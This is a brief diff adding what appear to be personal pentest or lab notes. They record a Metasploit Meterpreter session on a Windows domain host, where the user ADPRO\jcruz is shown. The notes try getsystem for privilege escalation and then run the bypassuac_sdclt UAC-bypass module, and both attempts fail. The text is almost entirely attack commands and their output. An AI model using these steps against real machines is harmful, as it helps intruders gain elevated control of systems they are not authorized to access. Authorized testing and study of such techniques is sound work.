@@ -1,0 +1,15 @@
+MSF console 
+```meterpreter
+meterpreter > getuid
+Server username: ADPRO\jcruz
+
+LSASS command 
+meterpreter > getsystem
+[-] priv_elev_getsystem: Operation failed: All pipe instances are busy.
+
+
+(UAC) user access conrtol bypass 
+msf exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
+msf exploit(windows/local/bypassuac_sdclt) > set SESSION 1
+msf exploit(windows/local/bypassuac_sdclt) > exploit
+[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
